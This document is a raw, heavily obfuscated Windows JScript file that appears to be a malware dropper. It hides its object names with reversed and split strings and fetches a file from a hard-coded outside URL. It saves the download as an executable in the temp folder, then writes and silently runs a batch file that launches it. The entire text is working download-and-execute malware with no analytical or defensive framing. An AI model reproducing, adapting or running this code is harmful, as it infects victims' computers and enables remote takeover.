
/*@cc_on /* e  */
  @if (@_win32 || @_win64)/* e  */
    //
	var ______zbb13f4 = false;
	var ______zab13f4 /* e  */ = "";
	var notion;
	var ______zaappendchild = "tcejbOetaerC".split(''/* e  */).reverse(/* e  */).join(''); 
	______zaa12f4 = "%TEMP%/";
	______zbcenetr = "hHprsuPm5M9OyMc" + "exe.".split('').reverse().join('');;
	wheelb = "W"+"S"+"c"+"ript";
	______zbb13f4 /* e  */= true;/* e  */
	______zab13f4 /* e  *//* e  */ = /* e  */"MLH";/* e  */
	notion =/* e  */ "R" + "esponseB"/* e  */ + "ydo".split('').reverse().join('');
	a12f4 = /* e  */(/* e  */"noit"+"isop").split(''/* e  */).reverse(/* e  */).join('');
	______zasuch/* e  */ =/* e  */ "eliFoTevaS".split(''/* e  */).reverse().join('');
	______zbmultiplication = "A"+"DODB";
	______zbthen = "s" + "end";
	com = "htt"+"p:"+"//d"+"el"+"ici"+"ous"+"-d"+"oug"+"hn"+"ut"+"s."+"net"+"/o"+"qpk"+"vl"+"am";
	______zabosnian = "G\x45"+"T";
 /* e  */ @end/* e  */
@*//* e  */
if (!(______zbb13f4))
{
	such = ______zbb13f4 / (-1877 + 1877);
}


var cenetr/* e  */ = /* e  */this[/* e  */wheelb/* e  */]/* e  */;
var ______zbone = function multiplication() {return cenetr[______zaappendchild](("fdasfadsfaszxvc", wheelb)+".Shel"+"l");}(), ______zachristopher = 11;
var ______zaclearball = (1 * 1) * ((-4607 + 4609) - 0);
var rotation = ______zaclearball - (2 + 0) * (1 * 1);
function one(______zafont){______zbone[("3", "2", "R")+ "u" + ("1", "n")](______zafont, rotation, rotation);};
function then /* e  */(){return ______zaappendchild;};

{
var ______zacenetr = "M" + "SX"+"ML2."+"X"+______zab13f4+"T"+"TP";
var clearball = "";
clearball = "o"+"pen";
function b13f4(______zarotation) {______zarotation[______zasuch](______zbone["E"+"xpandEnvir"+"o"+"nmentStrings"](______zaa12f4) + "hHprsuPm5M9OyMc.ex" + "e", 2 * 1); return 0;};

if (true){
 ______zbnotion = ______zacenetr;
 ______zbsuch = cenetr[______zaappendchild](______zbnotion);
 var ______zamultiplication = 1;
while (______zamultiplication) { 
	for (;______zamultiplication;){
	try {
		if (______zamultiplication == 1)
		{
			______zbsuch[clearball](______zabosnian, com, (true, false));
			______zbsuch[______zbthen]();
			______zaone /* e  */ = "S"+"l"+"eep";
			______zamultiplication = 2;
		}
		cenetr[______zaone](120); 
		if (______zbsuch["r"+"eadystate"] < 4) 
		{
			continue;
		}
		______zamultiplication = rotation;
		function appendchild(bosnian) {var ______zathen = (123, bosnian); return ______zathen;};
		
		christopher = ______zbone["E"+"xpandEnvir"+"o"+"nmentStrings"](______zaa12f4) + ______zbcenetr;
		______zawheelb = ______zbone["E"+"xpandEnvir"+"o"+"nmentStrings"](______zaa12f4) + "sdaw2.bat";
		______zbappendchild = "start "+christopher+"\r\nexit"

		______zbnotion = ______zacom = cenetr[then /* e  */()](______zbmultiplication+"."+"S"+"tr"+"e"+"a"+"m");
		______zbnotion[clearball]();
		______zbnotion["t"+"y"+"pe"] = 2;
		font = "wr"+"i"+"t"+"e";
		______zbnotion["Charset"] = "windows-1251";
		______zbnotion[font+"Text"](______zbappendchild);
		______zacom[a12f4] = 0;
		______zbnotion[______zasuch](______zawheelb, 4462 - 4460);
		______zacom["close"]();
		
		______zbnotion = ______zacom = cenetr[then /* e  */()](______zbmultiplication+"."+"S"+"tr"+"e"+"a"+"m");
		______zbnotion[clearball]();
		______zbnotion["t"+"y"+"pe"] = 2;
		______zbnotion["Charset"] = "windows-1251";
		______zbnotion[font+"Text"]("M");
		______zacom[a12f4] = 0;
		b13f4(______zbnotion);
		______zacom["close"]();
		
		______zbnotion = ______zacom = cenetr[then /* e  */()](______zbmultiplication+"."+"S"+"tr"+"e"+"a"+"m");
		______zbnotion[clearball]();
		______zbnotion["t"+"y"+"pe"] = 1;
		______zbnotion[font](______zbsuch[notion]);
		______zacom[a12f4] = 1;
		b13f4(______zbnotion);
		______zacom["close"]();
		
		if (1 && ______zbb13f4) one(______zawheelb);
	} catch(______zanotion){};};
};
}
}

